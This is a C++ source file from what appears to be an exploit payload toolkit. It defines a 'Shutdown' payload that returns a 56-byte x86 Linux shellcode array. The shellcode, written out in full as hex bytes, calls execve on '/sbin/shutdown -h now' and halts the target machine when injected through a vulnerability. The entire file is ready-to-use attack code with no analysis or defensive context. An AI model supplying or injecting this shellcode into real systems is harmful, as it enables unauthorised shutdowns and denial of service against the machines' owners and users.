#include "Payloads/Shutdown/Shutdown.hpp"

uint8_t* Shutdown::getPayload(size_t* length, argparse::ArgumentParser program)
{
    size_t len = 56;
    if (length != nullptr)
        *length = len;

    uint8_t payload[] = {
        0x31, 0xc0, 0x31, 0xd2, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x89, 0xe7, 0x50, 0x6a, 0x6e, 0x66, 0xc7,
        0x44, 0x24, 0x01, 0x6f, 0x77, 0x89, 0xe7, 0x50, 0x68, 0x64, 0x6f, 0x77, 0x6e, 0x68, 0x73, 0x68,
        0x75, 0x74, 0x68, 0x6e, 0x2f, 0x2f, 0x2f, 0x68, 0x2f, 0x73, 0x62, 0x69, 0x89, 0xe3, 0x52, 0x56,
        0x57, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80,
    };

    uint8_t* buffer = new uint8_t[len];
    memcpy(buffer, payload, len);
    return buffer;
}